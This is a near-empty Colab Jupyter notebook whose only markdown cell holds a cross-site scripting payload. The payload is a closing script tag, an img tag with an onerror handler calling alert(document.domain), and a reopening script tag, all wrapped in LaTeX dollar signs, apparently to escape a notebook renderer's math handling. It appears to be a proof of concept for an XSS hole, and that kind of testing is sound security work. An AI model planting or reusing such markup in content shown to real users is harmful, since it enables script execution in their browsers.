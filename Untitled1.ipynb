{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "$ </script><img src=1 onerror=alert(document.domain)><script> =}$"
      ],
      "metadata": {
        "id": "yjUH_7F4zHNd"
      }
    }
  ]
}